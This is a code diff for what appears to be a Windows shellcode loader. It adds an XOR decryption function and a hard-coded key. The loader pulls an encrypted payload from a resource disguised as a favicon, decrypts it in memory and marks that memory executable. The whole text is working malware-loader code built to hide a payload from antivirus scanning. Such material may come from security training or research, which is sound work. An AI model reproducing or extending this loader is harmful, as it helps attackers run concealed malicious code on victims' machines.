@@ -3,6 +3,18 @@
 #include <stdlib.h>
 #include <string.h>
 
+void XOR(char * data, size_t data_len, char * key, size_t key_len) {
+    int j;
+
+    j = 0;
+    for (int i = 0; i < data_len; i++) {
+        if (j == key_len - 1) j = 0;
+
+        data[i] = data[i] ^ key[j];
+        j++;
+    }
+}
+
 int main(void) {
 
     void * exec_mem;
@@ -15,6 +27,8 @@ int main(void) {
     unsigned char * payload;
     unsigned int payload_len;
 
+    char key[] = "mysecretkeee";
+    
     //extract payload from resources section 
     res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
     resHandle = LoadResource(NULL, res);
@@ -27,6 +41,9 @@ int main(void) {
     //copy payload to new memory buffer
     RtMoveMemory(exec_mem, payload, payload_len);
 
+    //decrypt (DeXOR) the payload
+    XOR((char *) exec_mem, payload_len, key, sizeof(key));
+    
     //make the buffer executable
     rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
